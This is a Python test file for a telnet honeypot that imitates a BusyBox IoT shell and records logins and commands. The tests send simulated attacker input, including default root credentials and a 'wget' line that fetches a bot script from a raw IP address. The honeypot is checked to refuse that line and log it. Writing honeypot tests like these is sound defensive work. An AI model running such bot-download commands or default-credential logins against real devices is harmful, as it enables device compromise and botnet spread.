"""Telnet decoy end-to-end: login flow, fake BusyBox shell, command capture."""

from __future__ import annotations

import socket

from honeyforge.services.telnet import TelnetHoneyService

from .util import HoneyTestCase, recv_all, recv_until


class TelnetHoneyServiceTests(HoneyTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.service = TelnetHoneyService("127.0.0.1", 0, self.bus,
                                          banner="BusyBox v1.22.1 shell\n", prompt="# ")
        self.start_service(self.service)
        self.sock = socket.create_connection(
            ("127.0.0.1", self.service.bound_port), timeout=5
        )
        self.addCleanup(self.sock.close)

    def _send(self, text: str) -> None:
        self.sock.sendall((text + "\n").encode())

    def test_login_flow_captures_credentials(self) -> None:
        banner = recv_until(self.sock, b"login: ")
        self.assertIn(b"BusyBox v1.22.1", banner)
        self._send("root")
        recv_until(self.sock, b"Password: ")
        self._send("admin123")
        recv_until(self.sock, b"# ")
        self.wait_for(lambda: self.events.of_type("login_attempt"),
                      message="login_attempt event")
        login = self.events.of_type("login_attempt")[0]
        self.assertEqual(login.details["username"], "root")
        self.assertEqual(login.details["password"], "admin123")
        rows = self.storage.recent_logins(5)
        self.assertEqual(rows[0]["username"], "root")

    def test_shell_serves_fake_command_output_and_records_commands(self) -> None:
        recv_until(self.sock, b"login: ")
        self._send("root")
        recv_until(self.sock, b"Password: ")
        self._send("toor")
        recv_until(self.sock, b"# ")

        self._send("ls")
        out = recv_until(self.sock, b"# ")
        self.assertIn(b"bin  dev  etc", out)

        self._send("cat /proc/cpuinfo")
        out = recv_until(self.sock, b"# ")
        self.assertIn(b"MIPS 24Kc", out)

        self._send("wget http://185.10.10.10/bot.sh")
        out = recv_until(self.sock, b"# ")
        self.assertIn(b"Permission denied", out)

        self._send("bogus")
        out = recv_until(self.sock, b"# ")
        self.assertIn(b"sh: bogus: not found", out)

        self._send("exit")
        out = recv_until(self.sock, b"foreign host")
        self.assertIn(b"Connection closed", out)

        self.wait_for(lambda: len(self.events.of_type("command")) >= 5,
                      message="command events")
        commands = [e.details["command"] for e in self.events.of_type("command")]
        self.assertIn("wget http://185.10.10.10/bot.sh", commands)
        self.assertIn("bogus", commands)

    def test_telnet_iac_negotiation_is_stripped_from_input(self) -> None:
        recv_until(self.sock, b"login: ")
        self.sock.sendall(b"\xff\xfd\x01root\n")  # IAC DO + username
        recv_until(self.sock, b"Password: ")
        self._send("x")
        recv_until(self.sock, b"# ")
        self.wait_for(lambda: self.events.of_type("login_attempt"),
                      message="login_attempt event")
        login = self.events.of_type("login_attempt")[0]
        self.assertEqual(login.details["username"], "root")

    def test_blasted_lines_are_never_dropped(self) -> None:
        """Regression: a worm that fires every line without waiting for
        prompts must still have all of them captured and answered."""
        greeting = recv_until(self.sock, b"login: ")
        self.assertIn(b"BusyBox v1.22.1", greeting)
        # login + three commands in a single burst
        self.sock.sendall(b"root\ntoor\nls\ncat /proc/cpuinfo\nbusybox\n")
        out = recv_until(self.sock, b"not found\n".replace(b"found", b"found"), timeout=5)
        out += recv_all(self.sock, 2.0)
        self.assertIn(b"MIPS 24Kc", out)
        self.assertIn(b"multi-call binary", out)
        self.wait_for(lambda: len(self.events.of_type("command")) >= 3,
                      message="all blasted commands captured")
        commands = [e.details["command"] for e in self.events.of_type("command")]
        self.assertEqual(commands, ["ls", "cat /proc/cpuinfo", "busybox"])
        login = self.events.of_type("login_attempt")[0]
        self.assertEqual((login.details["username"], login.details["password"]),
                         ("root", "toor"))


if __name__ == "__main__":
    unittest.main()
